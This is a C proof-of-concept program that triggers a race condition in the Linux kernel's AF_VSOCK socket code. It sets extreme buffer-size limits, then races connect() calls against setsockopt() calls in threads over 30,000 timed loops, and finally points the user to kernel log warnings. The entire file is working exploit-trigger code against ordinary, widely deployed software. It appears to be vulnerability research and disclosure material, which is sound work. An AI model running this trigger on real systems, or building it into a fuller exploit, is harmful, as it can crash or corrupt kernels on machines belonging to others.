/*
 * AF_VSOCK vulnerability trigger.
 * It's a PoC just for fun.
 * Author: Alexander Popov <alex.popov@linux.com>.
 */

#include <stdio.h>
#include <stdlib.h>
#include <pthread.h>
#include <sys/socket.h>
#include <linux/vm_sockets.h>
#include <unistd.h>

#define err_exit(msg) do { perror(msg); exit(EXIT_FAILURE); } while (0)

#define MAX_RACE_LAG_USEC 50

int vsock = -1;
int tfail = 0;
pthread_barrier_t barrier;

int thread_sync(long lag_nsec)
{
	int ret = -1;
	struct timespec ts0;
	struct timespec ts;
	long delta_nsec = 0;

	ret = pthread_barrier_wait(&barrier);
	if (ret != 0 && ret != PTHREAD_BARRIER_SERIAL_THREAD) {
		perror("[-] pthread_barrier_wait");
		return EXIT_FAILURE;
	}

	ret = clock_gettime(CLOCK_MONOTONIC, &ts0);
	if (ret != 0) {
		perror("[-] clock_gettime");
		return EXIT_FAILURE;
	}

	while (delta_nsec < lag_nsec) {
		ret = clock_gettime(CLOCK_MONOTONIC, &ts);
		if (ret != 0) {
			perror("[-] clock_gettime");
			return EXIT_FAILURE;
		}

		delta_nsec = (ts.tv_sec - ts0.tv_sec) * 1000000000 +
						ts.tv_nsec - ts0.tv_nsec;
	}

	return EXIT_SUCCESS;
}

void *th_connect(void *arg)
{
	int ret = -1;
	long lag_nsec = *((long *)arg) * 1000;
	struct sockaddr_vm addr = {
		.svm_family = AF_VSOCK,
	};

	ret = thread_sync(lag_nsec);
	if (ret != EXIT_SUCCESS) {
		tfail++;
		return NULL;
	}

	addr.svm_cid = VMADDR_CID_LOCAL;
	connect(vsock, (struct sockaddr *)&addr, sizeof(struct sockaddr_vm));

	addr.svm_cid = VMADDR_CID_HYPERVISOR;
	connect(vsock, (struct sockaddr *)&addr, sizeof(struct sockaddr_vm));

	return NULL;
}

void *th_setsockopt(void *arg)
{
	int ret = -1;
	long lag_nsec = *((long *)arg) * 1000;
	struct timespec tp;
	unsigned long size = 0;

	ret = thread_sync(lag_nsec);
	if (ret != EXIT_SUCCESS) {
		tfail++;
		return NULL;
	}

	clock_gettime(CLOCK_MONOTONIC, &tp);
	size = tp.tv_nsec;
	setsockopt(vsock, PF_VSOCK, SO_VM_SOCKETS_BUFFER_SIZE,
						&size, sizeof(unsigned long));

	return NULL;
}

int main(void)
{
	int ret = -1;
	unsigned long size = 0;
	long loop = 0;
	pthread_t th[2] = { 0 };

	vsock = socket(AF_VSOCK, SOCK_STREAM, 0);
	if (vsock == -1)
		err_exit("[-] open vsock");

	printf("[+] AF_VSOCK socket is opened\n");

	size = 1;
	setsockopt(vsock, PF_VSOCK, SO_VM_SOCKETS_BUFFER_MIN_SIZE,
						&size, sizeof(unsigned long));
	size = 0xfffffffffffffffdlu;
	setsockopt(vsock, PF_VSOCK, SO_VM_SOCKETS_BUFFER_MAX_SIZE,
						&size, sizeof(unsigned long));

	ret = pthread_barrier_init(&barrier, NULL, 2);
	if (ret != 0)
		err_exit("[-] pthread_barrier_init");

	for (loop = 0; loop < 30000; loop++) {
		long tmo1 = 0;
		long tmo2 = loop % MAX_RACE_LAG_USEC;

		printf("race loop %ld: tmo1 %ld, tmo2 %ld\n", loop, tmo1, tmo2);

		ret = pthread_create(&th[0], NULL, th_connect, &tmo1);
		if (ret != 0)
			err_exit("[-] pthread_create #0");

		ret = pthread_create(&th[1], NULL, th_setsockopt, &tmo2);
		if (ret != 0)
			err_exit("[-] pthread_create #1");

		ret = pthread_join(th[0], NULL);
		if (ret != 0)
			err_exit("[-] pthread_join #0");

		ret = pthread_join(th[1], NULL);
		if (ret != 0)
			err_exit("[-] pthread_join #1");

		if (tfail) {
			printf("[-] some thread got troubles\n");
			exit(EXIT_FAILURE);
		}
	}

	ret = close(vsock);
	if (ret)
		perror("[-] close");

	printf("[+] now see your warnings in the kernel log\n");
	return 0;
}
